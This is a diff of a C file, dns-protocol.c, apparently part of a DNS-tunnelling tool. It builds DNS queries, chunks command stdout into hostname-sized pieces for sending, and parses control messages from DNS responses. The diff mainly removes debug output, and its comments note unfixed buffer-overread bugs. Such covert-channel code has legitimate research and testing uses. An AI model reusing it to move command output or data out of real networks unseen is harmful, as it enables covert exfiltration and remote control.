@@ -1,12 +1,3 @@
-/*
- * dns-protocol.c
- *
- *  Created on: Jan 17, 2016
- *      Author: joe
- */
-
-// includes
-
 // includes
 #include <stddef.h>	      // NULL = 0
 #include <stdio.h>		  // printf
@@ -20,7 +11,6 @@
 
 // global variables
 unsigned int debug = 0;
-
 
 /*
  * This module will implement the various functionality associated with
@@ -48,8 +38,6 @@ unsigned int debug = 0;
 
 /*
  * function name - createDnsQueryPacket
- *
- *
  *
  * arguments - _fqdn => The fully qual domain name to go inside QNAME field
  * 						The hostName typically consists of host.SLD.TLD.
@@ -94,23 +82,6 @@ unsigned char *createDnsQueryPacket(unsigned char _msgType,
 	if(hostName != NULL)
 		free(hostName);
 
-	//printf("[-] Printing DNS Query Message Packet \n");
-	//printf("DNS Header Section \n");
-	//printf("id -> %u 		\n", ptrStructDnsH->id);
-	//printf("flags -> %u 	\n", ptrStructDnsH->flags);
-	//printf("qdcode -> %u    \n", ptrStructDnsH->qdcode);
-	//printf("ancount -> %u   \n", ptrStructDnsH->ancount);
-	//printf("nscount -> %u   \n", ptrStructDnsH->nscount);
-	//printf("arcount -> %u   \n", ptrStructDnsH->arcount);
-	//printf("---------------------------------- \n");
-
-	//printf("DNS Question Section \n");
-	//printf("question -> ");
-	//stringPrinter(ptrStructDnsQ->qname, strlen(ptrStructDnsQ->qname)+1);
-	//printf("\n");
-	//printf("type -> %u 		\n", ptrStructDnsQ->qtype);
-	//printf("class -> %u		\n", ptrStructDnsQ->qclass);
-
 	dnsQueryPacket = malloc(sizeof(struct DNS_HEADER) +
 							(strlen(ptrStructDnsQ->qname)+1) +
 								sizeof(ptrStructDnsQ->qtype) +
@@ -125,8 +96,6 @@ unsigned char *createDnsQueryPacket(unsigned char _msgType,
 		//retFlag = 1;
 		exit(1);
 	}
-
-	// copy each value into *stdoutBuffArg array elements
 
 	/* dns header section field member copy */
 	putShort(dnsQueryPacket, &(ptrStructDnsH->id), 		&buffIndex);
@@ -144,13 +113,6 @@ unsigned char *createDnsQueryPacket(unsigned char _msgType,
 
 	putShort(dnsQueryPacket, &(ptrStructDnsQ->qtype),  &buffIndex);
 	putShort(dnsQueryPacket, &(ptrStructDnsQ->qclass), &buffIndex);
-
-	// free here?
-	////if (ptrStructDnsH != NULL)
-	///	free(ptrStructDnsH);
-
-	///if (ptrStructDnsQ != NULL)
-	//	free(ptrStructDnsQ);
 
 	// buffIndex is the length of our udp datagram aka dns packet
 	*_sendLen = buffIndex;
@@ -196,7 +158,7 @@ unsigned char *createDnsRfcQueryString(unsigned char *qNameArg,
 	{
 		printf(">>> strlen(qNameArg) <= 0) <<< \n");
 		printf("return value was less than or equal to 0.. exiting \n");
-		//retFlag = 1;
+		// how to handle errors like this
 		exit(1);
 	}
 
@@ -218,8 +180,6 @@ unsigned char *createDnsRfcQueryString(unsigned char *qNameArg,
 	{
 		// retrieve first character from qNameArg
 		c = qNameArg[qNameArgIndex];
-		//printf("qNameArgIndex[%u] - char: %c\n",
-		//			qNameArgIndex, qNameArg[qNameArgIndex]);
 
 		if(c == '.')
 		{
@@ -371,9 +331,6 @@ struct DNS_QUESTION *buildDnsQuestion(unsigned char *qNameArg,
 	// create a compliant DNS query name that returns the string and length
 	rfcQName = createDnsRfcQueryString(qNameArg, &rfcQNameLength);
 
-	printf("[-] just built the rfc string \n");
-	//stringPrinter(rfcQName, rfcQNameLength); printf("\n");
-
 	if(rfcQName == NULL)
 	{
 		printf(">>> "
@@ -400,10 +357,6 @@ struct DNS_QUESTION *buildDnsQuestion(unsigned char *qNameArg,
 	// assigned remaining struct field members
 	ptrStructDnsQ->qtype  = htons(qtypeArg);
 	ptrStructDnsQ->qclass = htons(qclassArg);
-
-	// return rfcQNameLength to caller
-	//*qNameLengthArg = rfcQNameLength;
-	//
 
 	if(debug)
 		printf("=====/end buildDnsQuestion() ===== \n");
@@ -449,20 +402,9 @@ struct NODE *constructStdoutList(unsigned char *_stdoutBuffer,
 	}
 
 	// each list member structure defined below
-	///struct STDOUT_CHUNK_NODE *head;
-	int chunkSize = 40; //global variable to modify?
+	int chunkSize = 15; //global variable to modify? --- with encoding, stdoutBuff is 2x longer
 	int mallocAmt = 0;
-
-	printf("chunkSize: %u \n", chunkSize);
-	printf("stdoutSize: %u \n", _stdoutSize);
-
-	struct NODE *head = NULL; //createList();
-
-	/* allocate memory for head node */
-
-	////head = malloc(sizeof(struct STDOUT_CHUNK_NODE)); // make sure to free !
-	//head->stdoutHostname = NULL;
-	////head->next = NULL;
+	struct NODE *head = NULL;
 
 	// keep track of index into _stdoutBuffer.. while loop here?
 	int bytesTransmitted = 0;
@@ -471,33 +413,20 @@ struct NODE *constructStdoutList(unsigned char *_stdoutBuffer,
 	// while we have not grabbed each byte of stdout
 	while(bytesRemaining > 0)
 	{
-		printf("bytes transmitted: %u \n", bytesTransmitted);
-		printf("bytes remaining: %u \n\n", bytesRemaining);
-
-		// before pushing to hostName Node, need to create the hostName by appending.
-		///unsigned char hostName[64];
 
 		if(bytesRemaining <= chunkSize)
 		{
-			//memcpy(hostName, &(_stdoutBuffer[bytesTransmitted]), bytesRemaining);
 			enqueue(&head, &(_stdoutBuffer[bytesTransmitted]), bytesRemaining);
 			bytesTransmitted = bytesRemaining;
 			bytesRemaining = 0;
 		}
 		else // we have at least 1 more than chunkSize bytes left
 		{
-			//memcpy(hostName, &(_stdoutBuffer[bytesTransmitted]), chunkSize);
 			enqueue(&head, &(_stdoutBuffer[bytesTransmitted]), chunkSize);
 			bytesTransmitted = (bytesTransmitted + chunkSize);
 			bytesRemaining = (_stdoutSize - bytesTransmitted);
 		}
-
-		// clear hostName
-		//memset(hostName, '\0', 255);
 	}
-
-	//printf("bytes transmitted: %u \n", bytesTransmitted);
-	//printf("bytes remaining: %u \n", bytesRemaining);
 
 	if(debug)
 		printf("=====/end constructStdoutList() ===== \n");
@@ -531,9 +460,7 @@ struct DNS_RESPONSE_PACKET *parseDnsResponse(unsigned char *_recvBuff,
 
 	int buffIndex = 0;
 	struct DNS_RESPONSE_PACKET *response = NULL;
-	puts("525");
 	response = malloc(sizeof(struct DNS_RESPONSE_PACKET));
-	puts("257");
 
 	/* fetch dns header fields from reply */
 	fetchShort(&(response->dnsHeader.id), 	    _recvBuff, &buffIndex);
@@ -549,7 +476,7 @@ struct DNS_RESPONSE_PACKET *parseDnsResponse(unsigned char *_recvBuff,
 	int qNameLen = strlen(&(_recvBuff[buffIndex])) + 1;
 	printf("qNameLen: %u \n", qNameLen);
 	response->dnsQuestion.qname = malloc(sizeof(unsigned char)*qNameLen);
-	puts("finished dnsq.Name malloc \n");
+
 	fetchString(response->dnsQuestion.qname,    _recvBuff, qNameLen, &buffIndex);
 	fetchShort(&(response->dnsQuestion.qtype),  _recvBuff, &buffIndex);
 	fetchShort(&(response->dnsQuestion.qclass), _recvBuff, &buffIndex);
@@ -561,8 +488,6 @@ struct DNS_RESPONSE_PACKET *parseDnsResponse(unsigned char *_recvBuff,
 	fetchInt  (&(response->dnsAnswer.ttl),      _recvBuff, &buffIndex);
 	fetchShort(&(response->dnsAnswer.rdlength), _recvBuff, &buffIndex);
 	fetchInt  (&(response->dnsAnswer.rdata),    _recvBuff, &buffIndex);
-
-    //printDnsResponse(response);
 
 	// end func
 	if(debug)
@@ -620,7 +545,6 @@ void printControlFields(struct CONTROL *c)
 // not modifying values of drp, pass by value is ok
 // bugs -- if sizeofMessage - "control bytes (2)" > size of label qname[0]
 // another BUG -- the message should not be longer than qname itself...
-
 struct CONTROL *getControl(struct DNS_RESPONSE_PACKET *drp)
 {
 	if(debug)
@@ -634,7 +558,7 @@ struct CONTROL *getControl(struct DNS_RESPONSE_PACKET *drp)
 	int z = 0;
 	unsigned char labelLength;
 	fetchChar(&labelLength, drp->dnsQuestion.qname, &z);
-	printf("label length: %u \n", labelLength);
+	//printf("label length: %u \n", labelLength);
 
 	int offset = MESSAGE_TYPE_PARSE_OFFSET;
 
@@ -644,11 +568,11 @@ struct CONTROL *getControl(struct DNS_RESPONSE_PACKET *drp)
 	/* get messageLength */
 	fetchChar(&(ctrl->messsageLength), drp->dnsQuestion.qname, &offset);
 
-	printf("orig mesg length: %u \n", ctrl->messsageLength);
+	//printf("orig mesg length: %u \n", ctrl->messsageLength);
 
 	if(ctrl->messsageLength > labelLength)
 	{
-		puts("messageLength is way too longer! ");
+		//puts("messageLength is way too longer! ");
 		ctrl->messsageLength = labelLength;
 	}
 
@@ -662,11 +586,6 @@ struct CONTROL *getControl(struct DNS_RESPONSE_PACKET *drp)
 
 	// null terminate string
 	putChar(ctrl->message, &endOfStr, &offset);
-
-	printf("finalized ctrl-> mesage: %s \n", ctrl->message); //exit(1);
-
-	// BUG here -- copying bytes way past dnsquestion qname +++++ and into
-	// safe ctrl-> message block... but I think
 
 	if(debug)
 		printf("====/end getControl() ==== \n");
